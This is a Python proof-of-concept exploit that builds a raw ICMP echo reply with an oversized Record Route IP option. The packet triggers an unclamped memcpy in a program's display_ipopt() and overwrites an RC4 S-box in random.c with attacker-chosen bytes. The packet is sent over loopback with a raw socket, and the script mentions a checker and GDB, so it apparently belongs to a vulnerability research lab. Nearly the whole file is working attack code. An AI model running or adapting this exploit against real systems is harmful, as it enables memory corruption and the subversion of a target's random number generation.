#!/usr/bin/env python3
"""Loopback-only crafted ICMP echo reply that writes a chosen permutation
into random.c's rc4_sbox[0..186] via display_ipopt()'s unclamped memcpy.

W2/W6 mapping in the real plain build:
    rc4_sbox[n] == ICMP payload[18+n],  n = 0..186
Payload bytes 0..17 stay a marker so the checker can locate the crafted GDB
state.  The 187 bytes written define S[n] for every reachable index, so a
permutation with S[n]=(n+1)&0xff covers every index hp_rand can touch before
it reaches the unreachable tail (187..255).  No pinned source is edited.
Traffic stays on 127.0.0.2 -> 127.0.0.1 with an AF_INET/IP_HDRINCL raw socket.
"""
import argparse
import socket
import struct
import time

from inject_rr import csum

LEAD = bytes(range(0xA0, 0xA0 + 18))
TAIL_LEN = 187  # payload[18 .. 204] -> rc4_sbox[0 .. 186]


def frame(pid, rr_len, ptr, tail):
    ident = pid & 0xFFFF
    payload = LEAD + tail
    assert len(payload) == 205
    icmp = struct.pack("!BBH", 0, 0, 0) + struct.pack("<H", ident) + struct.pack("!H", 0)
    icmp += payload
    opts = bytes([7, rr_len & 0xFF, ptr & 0xFF]) + bytes(range(0xA0, 0xA0 + 36)) + b"\0"
    assert len(opts) == 40
    total_len = 20 + len(opts) + len(icmp)
    ip = struct.pack("!BBHHHBBH4s4s", 0x4F, 0, total_len, 0x1234, 0, 64, 1, 0,
                     socket.inet_aton("127.0.0.2"), socket.inet_aton("127.0.0.1"))
    ip += opts
    ip = ip[:10] + struct.pack("!H", csum(ip)) + ip[12:]
    return ip + icmp


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--pid", type=int, required=True)
    ap.add_argument("--rr-len", type=int, default=255)
    ap.add_argument("--ptr", type=int, default=255)
    ap.add_argument("--mode", choices=("inc", "dec", "const"), default="inc")
    ap.add_argument("--fill", type=int, default=0x20)
    ap.add_argument("--count", type=int, default=3)
    ap.add_argument("--gap", type=float, default=0.15)
    a = ap.parse_args()
    if a.mode == "inc":
        tail = bytes((n + 1) & 0xFF for n in range(TAIL_LEN))
    elif a.mode == "dec":
        tail = bytes((n - 1) & 0xFF for n in range(TAIL_LEN))
    else:
        tail = bytes([a.fill]) * TAIL_LEN
    packet = frame(a.pid, a.rr_len, a.ptr, tail)
    s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
    s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
    try:
        for _ in range(a.count):
            s.sendto(packet, ("127.0.0.1", 0))
            time.sleep(a.gap)
    finally:
        s.close()
    print("injected %d permutation frames: mode=%s tail[0..4]=%s pid=%d" %
          (a.count, a.mode, " ".join("0x%02x" % b for b in tail[:5]), a.pid))


if __name__ == "__main__":
    raise SystemExit(main())
